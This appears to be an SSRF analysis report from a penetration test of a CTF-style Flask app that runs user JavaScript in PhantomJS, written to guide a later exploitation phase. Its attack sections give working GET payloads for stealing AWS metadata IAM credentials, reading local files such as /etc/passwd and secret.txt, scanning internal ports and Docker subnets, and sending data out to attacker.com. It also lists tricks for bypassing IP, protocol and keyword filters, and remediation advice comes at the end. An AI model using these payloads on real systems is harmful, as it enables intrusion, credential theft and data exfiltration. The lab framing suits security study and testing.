# SSRF Analysis Report

## 1. Executive Summary
- **Analysis Status:** Complete
- **Key Outcome:** One critical Server-Side Request Forgery vulnerability was identified in the PhantomJS HTML loading mechanism. The application allows user-controlled JavaScript to execute server-side with unrestricted network access, enabling access to internal services, cloud metadata endpoints, and local filesystem.
- **Purpose of this Document:** This report provides strategic context on the application's outbound request mechanisms, dominant flaw patterns, and key architectural details necessary to effectively exploit the SSRF vulnerabilities listed in the exploitation queue.

## 2. Dominant Vulnerability Patterns

### Pattern 1: User-Controlled JavaScript Execution in Headless Browser
- **Description:** The application uses PhantomJS (a headless WebKit browser) to validate XSS exploits by loading user-generated HTML. While the URL loaded by PhantomJS is hardcoded (`http://localhost:5000/static/<random>.html`), the JavaScript content within that HTML is entirely user-controlled. PhantomJS executes this JavaScript server-side with full network capabilities.
- **Implication:** Attackers can inject JavaScript payloads that make arbitrary HTTP/HTTPS requests to internal services, cloud metadata endpoints (169.254.169.254), localhost services, or external domains. The application also allows `file://` protocol access for local file reads.
- **Representative Finding:** `SSRF-VULN-01`

### Pattern 2: Complete Absence of Network Restrictions
- **Description:** PhantomJS is invoked without any security flags, page.settings configurations, or CSP headers. No protocol allowlisting, hostname validation, IP filtering, or port restrictions are implemented.
- **Implication:** The attack surface is maximally permissive - attackers can target any protocol (http://, https://, file://), any IP address (including private ranges and cloud metadata), and any port.
- **Representative Finding:** `SSRF-VULN-01`

### Pattern 3: Ineffective Input Validation
- **Description:** The application implements a single-word blacklist that blocks only the string "import" (intended for XSS prevention). This filter does not prevent any SSRF attack vectors.
- **Implication:** All JavaScript-based network request mechanisms bypass the filter: `fetch()`, `XMLHttpRequest`, `<img>`, `<script>`, `<iframe>`, `<link>` tags, WebSocket connections, and form submissions.
- **Representative Finding:** `SSRF-VULN-01`

## 3. Strategic Intelligence for Exploitation

### HTTP Client Library
The application does not use traditional HTTP client libraries (like `requests` or `urllib`) for the SSRF vector. Instead, the SSRF mechanism is **PhantomJS** (version 2.1.1, abandoned since 2018), a headless WebKit browser with full JavaScript execution capabilities.

### Request Architecture
**Data Flow:**
1. User submits payload via `GET /page?name=<payload>`
2. Flask application applies minimal blacklist filter (blocks "import" only)
3. User input is embedded into JavaScript template: `var name = "%s";`
4. Complete HTML (with user JavaScript) is written to temporary file in `static/` directory with random filename
5. PhantomJS subprocess is invoked: `["timeout", "5", "phantomjs", "check.js"]`
6. PhantomJS loads `http://localhost:5000/static/<random>.html` via `page.open(url)`
7. User JavaScript executes in PhantomJS context with network access
8. PhantomJS detects if `alert()`, `confirm()`, or `prompt()` was called (XSS validation)
9. Temporary file is deleted
10. Response returned to user

**Key Architectural Details:**
- **PhantomJS Invocation:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-059-24/src/app.py:34`
  - Command: `subprocess.Popen(["timeout","5","phantomjs", "check.js"], stdout=subprocess.PIPE, stdin=subprocess.PIPE)`
  - Security Flags: **NONE** (no `--web-security`, no sandboxing, no network restrictions)
  
- **Temporary File Creation:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-059-24/src/app.py:35-40`
  - Filename: `static/<32_hex_chars>.html` (cryptographically random)
  - Content: User-controlled HTML with embedded JavaScript
  - Cleanup: File deleted in `finally` block
  
- **PhantomJS Script:** `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-059-24/src/check.js:20`
  - Opens URL via `page.open(input)`
  - No `page.settings` security configurations
  - No CSP headers or meta tags
  - Timeout: 5 seconds (limits duration but not scope)

### Available JavaScript APIs in PhantomJS Context
User-controlled JavaScript can leverage:
- **`fetch()` API** - Modern promise-based HTTP client
- **`XMLHttpRequest`** - Traditional AJAX requests
- **`<img src="...">`** - Image tags for GET requests (bypasses CORS)
- **`<script src="...">`** - External script loading
- **`<iframe src="...">`** - Frame embedding
- **`<link rel="stylesheet" href="...">`** - CSS loading
- **`<video>` / `<audio>` tags** - Media loading
- **`WebSocket`** - Persistent connections (if supported)
- **Dynamic form submission** - POST requests
- **`navigator.sendBeacon()`** - POST beaconing

### Accessible Protocols
PhantomJS supports and allows:
- ✅ **`http://`** - HTTP requests to any target
- ✅ **`https://`** - HTTPS requests to any target
- ✅ **`file://`** - Local file system access (read `/etc/passwd`, `/python-docker/secret.txt`, etc.)
- ✅ **`data://`** - Data URIs

### Accessible Targets
No IP filtering or hostname validation exists. Attackers can reach:
- **Cloud Metadata Endpoints:**
  - AWS: `http://169.254.169.254/latest/meta-data/`
  - GCP: `http://metadata.google.internal/computeMetadata/v1/`
  - Azure: `http://169.254.169.254/metadata/instance`
  
- **Internal Network (Private IP Ranges):**
  - `10.0.0.0/8` - Class A private
  - `172.16.0.0/12` - Class B private
  - `192.168.0.0/16` - Class C private
  - `127.0.0.0/8` - Loopback
  
- **Localhost Services:**
  - `http://localhost:5000` - Flask application itself
  - `http://127.0.0.1:6379` - Redis (if present)
  - `http://127.0.0.1:3306` - MySQL (if present)
  - Any port from 1-65535
  
- **External Internet:**
  - Attacker-controlled servers for data exfiltration
  - Public web services
  
- **Local Filesystem:**
  - `file:///python-docker/secret.txt` - Application secrets
  - `file:///etc/passwd` - System files
  - `file:///proc/self/environ` - Environment variables

### Internal Services
**Discovered from Reconnaissance:**
- Docker container networking: `172.17.0.0/16` (Docker bridge network)
- Localhost services accessible from within container
- No evidence of internal microservices or APIs beyond the Flask app itself
- Container runs as root with no capability restrictions

### Defense Mechanisms (All Ineffective)
1. **Blacklist Filter:** Only blocks "import" keyword - irrelevant to SSRF
2. **Timeout:** 5-second limit - prevents DoS but not exploitation
3. **Random Filenames:** Prevents filename prediction but not SSRF
4. **Subprocess Security:** No `shell=True` prevents command injection but not SSRF
5. **X-Content-Type-Options Header:** Only on response, not in PhantomJS-loaded HTML

### Technology Stack Context
- **Python 2.7.18** (End-of-Life since 2020)
- **Flask 1.1.4** (Outdated)
- **PhantomJS 2.1.1** (Abandoned since 2018, multiple unpatched WebKit CVEs)
- **Werkzeug 1.0.1** with debug mode enabled
- **No TLS/HTTPS** (HTTP only)
- **No authentication/authorization** (all endpoints public)

## 4. Secure by Design: Validated Components

The application has minimal secure components. However, the following areas were analyzed and found to NOT introduce SSRF vulnerabilities:

| Component/Flow | Endpoint/File Location | Defense Mechanism Implemented | Verdict |
|---|---|---|---|
| Static File Serving | `/static/*` route (Flask built-in) | Flask's built-in path traversal protection prevents directory escape via `../` | SAFE - Not SSRF-related |
| Subprocess Command Construction | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-059-24/src/app.py:34` | Uses argument list (not shell=True), fixed command arguments, no user input in command | SAFE - Command injection prevented, but SSRF still possible via HTML content |
| Temporary File Naming | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-059-24/src/app.py:35` | Cryptographically random filenames using `os.urandom(16)` | SAFE - Prevents file prediction, but not SSRF |
| Temporary File Cleanup | `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-059-24/src/app.py:50` | Files deleted in finally block after PhantomJS execution | SAFE - Prevents file accumulation, but not SSRF |

**Note:** While these components are implemented securely for their specific purposes (command injection prevention, path traversal protection), they do not address the core SSRF vulnerability in the PhantomJS JavaScript execution mechanism.

## 5. Attack Vector Analysis

### Primary Attack Vector: JavaScript-Based SSRF via PhantomJS

**Technique:** String Escape + JavaScript Injection
- User input is embedded in: `var name = "%s";`
- Attacker payload: `"; <javascript_here> //`
- Result: `var name = ""; <javascript_here> //"` - comment closes the string

**Example Payloads:**

**1. AWS Cloud Metadata Theft:**
```
GET /page?name=";fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(d=>alert(d));//
```
- Escapes string context
- Uses `fetch()` to retrieve IAM credentials
- Displays result via `alert()` (triggers flag revelation)

**2. Local File Read (Flag Extraction):**
```
GET /page?name=";<iframe src="file:///python-docker/secret.txt"></iframe>;//
```
- Embeds iframe with `file://` protocol
- Reads `secret.txt` containing flag
- Content accessible via XSS

**3. Internal Port Scanning:**
```
GET /page?name=";for(var i=1;i<1000;i++){fetch('http://127.0.0.1:'+i).then(r=>alert('Port '+i+' open')).catch(e=>{})};//
```
- Iterates through ports 1-999
- Makes requests to each port
- Reports open ports via alerts

**4. DNS Exfiltration:**
```
GET /page?name=";fetch('http://exfil-'+btoa(document.cookie)+'.attacker.com');//
```
- Exfiltrates data via subdomain
- Base64-encodes payload
- Attacker receives DNS query with data

**5. Internal Service Access (Redis Example):**
```
GET /page?name=";fetch('http://127.0.0.1:6379/').then(r=>r.text()).then(d=>alert(d));//
```
- Accesses Redis on default port
- Retrieves response
- Displays via alert

### Bypass Techniques for Potential Mitigations

**If IP Blacklisting Were Implemented:**
- **DNS Rebinding:** Use domain that resolves to public IP initially, then changes to 127.0.0.1
- **IPv6 Localhost:** `http://[::1]:5000/`
- **Alternative Localhost Representations:** `http://0.0.0.0/`, `http://127.1/`, `http://2130706433/` (decimal IP)
- **URL Encoding:** `http://127.0.0.1` → `http://127.0.0.%31`

**If Protocol Blacklisting Were Implemented:**
- **Mixed Case:** `FiLe://` or `HtTp://`
- **URL Encoding:** `file://` → `%66%69%6c%65://`
- **Null Bytes:** `file://\x00http://` (depends on parser)

**If Keyword Blacklisting Were Expanded:**
- **Obfuscation:** `eval(atob('ZmV0Y2go...'))` - Base64-encoded fetch call
- **String Concatenation:** `window['fe'+'tch']('http://target')`
- **Unicode Escapes:** `\u0066etch` instead of `fetch`
- **Indirect Invocation:** `this['constructor']['constructor']('return fetch')()('http://target')`

### Response-Based vs Blind SSRF

**Response-Based (Non-Blind):**
- Attacker can view responses via XSS output channel
- Use `alert(response_data)` to exfiltrate in XSS success message
- Example: AWS metadata retrieval shows IAM credentials

**Blind SSRF:**
- If response cannot be read directly, use out-of-band techniques:
  - DNS exfiltration: `fetch('http://data.attacker.com')`
  - HTTP callbacks: `<img src="http://attacker.com/log?status=success">`
  - Timing-based: Measure response times to detect open ports

**This Application:** **Non-Blind** - responses can be exfiltrated via `alert()` which triggers XSS validation and includes data in flag revelation mechanism.

## 6. Testing Methodology Recommendations for Exploitation Phase

### Phase 1: Confirm SSRF Capability (Out-of-Band)
**Objective:** Verify that PhantomJS can make outbound requests

**Test Payload:**
```
GET /page?name=";<img src="http://burpcollaborator.net/ssrf-test">;//
```

**Expected Result:**
- Collaborator receives HTTP GET request from server IP
- Confirms SSRF capability without requiring alert() trigger

### Phase 2: Cloud Metadata Enumeration
**Target:** AWS EC2 Instance Metadata (if deployed in AWS)

**Payload Sequence:**
1. Check metadata availability:
   ```
   GET /page?name=";fetch('http://169.254.169.254/latest/meta-data/').then(r=>r.text()).then(d=>alert(d));//
   ```

2. Retrieve IAM role name:
   ```
   GET /page?name=";fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/').then(r=>r.text()).then(d=>alert(d));//
   ```

3. Steal IAM credentials:
   ```
   GET /page?name=";fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME').then(r=>r.text()).then(d=>alert(d));//
   ```

### Phase 3: Internal Network Reconnaissance
**Objective:** Map internal services and open ports

**Port Scan Payload:**
```
GET /page?name=";var ports=[22,23,25,80,443,3306,5432,6379,8080,8443,9200];ports.forEach(p=>fetch('http://127.0.0.1:'+p).then(r=>alert('Port '+p+' open')).catch(e=>{}));//
```

**IP Range Scan (Docker Network):**
```
GET /page?name=";for(var i=1;i<255;i++){fetch('http://172.17.0.'+i+':80').then(r=>alert('Host 172.17.0.'+i+' up')).catch(e=>{})};//
```

### Phase 4: Local File Access
**Objective:** Read sensitive files from server filesystem

**Target Files:**
- `/python-docker/secret.txt` - Application flag
- `/etc/passwd` - System users
- `/proc/self/environ` - Environment variables
- `/proc/self/cmdline` - Process command line

**Payload:**
```
GET /page?name=";<iframe src="file:///python-docker/secret.txt" onload="alert(this.contentDocument.body.innerText)"></iframe>;//
```

### Phase 5: Data Exfiltration
**Objective:** Send discovered data to attacker server

**Exfiltration Payload:**
```
GET /page?name=";fetch('http://attacker.com/exfil',{method:'POST',body:JSON.stringify({flag:document.body.innerText})});//
```

## 7. Risk Assessment

### Exploitability: HIGH
- No authentication required
- Simple GET request with URL parameter
- Trivial string escape technique
- Well-documented JavaScript APIs

### Impact: CRITICAL
- **Cloud credentials theft** - Access to AWS/GCP/Azure IAM credentials
- **Internal network access** - Reconnaissance and exploitation of internal services
- **Local file read** - Access to application secrets, system files, environment variables
- **Data exfiltration** - Out-of-band channels for stealing sensitive data
- **Potential RCE** - If internal services (Redis, databases) are vulnerable to injection attacks

### Attack Complexity: LOW
- No special tools required beyond a web browser
- No multi-step authentication flows
- No race conditions or timing dependencies
- Publicly known techniques

### CVSS 3.1 Score Estimation: **9.1 (CRITICAL)**
- **Attack Vector:** Network (AV:N)
- **Attack Complexity:** Low (AC:L)
- **Privileges Required:** None (PR:N)
- **User Interaction:** None (UI:N)
- **Scope:** Changed (S:C) - affects resources beyond the vulnerable component
- **Confidentiality Impact:** High (C:H) - access to sensitive data
- **Integrity Impact:** Low (I:L) - limited ability to modify data
- **Availability Impact:** None (A:N) - no DoS impact

### Real-World Scenario Impact
**If deployed in AWS:**
1. Attacker steals EC2 IAM role credentials via metadata endpoint
2. Uses credentials to access S3 buckets, RDS databases, or other AWS resources
3. Potential for full AWS account compromise depending on IAM permissions

**If deployed in GCP:**
1. Attacker accesses `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token`
2. Retrieves OAuth token for service account
3. Uses token to access GCP APIs, Cloud Storage, etc.

**If deployed on-premises:**
1. Attacker scans internal network for services
2. Accesses internal APIs, databases, admin panels
3. Pivots to other internal systems
4. Reads local files for credentials or sensitive data

## 8. Remediation Recommendations

### Immediate (Critical Priority):
1. **Disable PhantomJS JavaScript execution for user input**
   - Stop embedding user input in `<script>` tags
   - Use server-side validation instead of client-side XSS detection

2. **Implement CSP headers**
   ```python
   response.headers["Content-Security-Policy"] = "default-src 'self'; script-src 'none'; connect-src 'none';"
   ```

3. **Add PhantomJS security flags**
   ```python
   proc = subprocess.Popen(["timeout","5","phantomjs", "--web-security=yes", "check.js"], ...)
   ```

### Short-Term (High Priority):
4. **Implement URL validation in check.js**
   ```javascript
   var allowedUrl = 'http://localhost:5000/static/';
   if (!input.startsWith(allowedUrl)) {
       console.log("Unauthorized URL");
       phantom.exit();
   }
   ```

5. **Configure page.settings for security**
   ```javascript
   page.settings.javascriptEnabled = false; // Disable JS execution
   page.settings.localToRemoteUrlAccessEnabled = false; // Block cross-origin
   ```

6. **Add resource request filtering**
   ```javascript
   page.onResourceRequested = function(requestData, networkRequest) {
       if (requestData.url.indexOf('localhost:5000') !== 0) {
           networkRequest.abort(); // Block non-localhost requests
       }
   };
   ```

7. **Implement IP blocklist**
   - Block 169.254.169.254 (cloud metadata)
   - Block 127.0.0.0/8 (loopback)
   - Block 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16 (private IPs)

### Long-Term (Medium Priority):
8. **Migrate away from PhantomJS**
   - PhantomJS abandoned since 2018 with unpatched vulnerabilities
   - Use Puppeteer or Playwright with proper sandboxing
   - Consider serverless architecture (AWS Lambda, GCP Cloud Functions)

9. **Implement network-level controls**
   - Use Docker network isolation
   - Implement egress filtering at firewall/iptables level
   - Deploy in separate network namespace

10. **Upgrade technology stack**
    - Python 2.7 → Python 3.11+
    - Flask 1.1.4 → Flask 3.x
    - Debian Buster → Debian Bookworm or Ubuntu 22.04 LTS

11. **Add comprehensive input validation**
    - Replace blacklist with allowlist approach
    - HTML-encode all user input
    - Use template engines with auto-escaping (Jinja2 with autoescape=True)

12. **Implement proper secret management**
    - Remove flag from version control
    - Use environment variables or secret management service
    - Rotate secrets after disclosure

### Defense-in-Depth Measures:
- Add rate limiting to prevent automated scanning
- Implement request logging for security monitoring
- Deploy Web Application Firewall (WAF)
- Add authentication/authorization (even for CTF, consider rate limiting per session)
- Enable HTTPS/TLS for all connections
- Implement security headers (HSTS, X-Frame-Options, X-XSS-Protection)

## 9. Conclusion

The Dalgona Challenges application contains a **critical SSRF vulnerability** with **HIGH confidence**. The root cause is user-controlled JavaScript execution in PhantomJS (a server-side headless browser) with completely unrestricted network access. The existing "import" keyword blacklist provides zero protection against SSRF attacks.

An external attacker with no authentication can:
- Access cloud metadata endpoints to steal IAM credentials
- Perform internal network reconnaissance and access internal services
- Read local files from the server filesystem via `file://` protocol
- Exfiltrate sensitive data to external servers

The vulnerability is trivially exploitable via a simple GET request with a JavaScript payload that escapes the string context. The impact is CRITICAL, potentially leading to full cloud account compromise, internal network pivot, or sensitive data theft.

**Recommended Next Steps for Exploitation Phase:**
1. Confirm SSRF capability via out-of-band request (Burp Collaborator)
2. Enumerate cloud metadata endpoints for credential theft
3. Scan internal network for accessible services
4. Read local filesystem for sensitive files
5. Document complete network access and prepare comprehensive exploitation report

**SSRF ANALYSIS COMPLETE**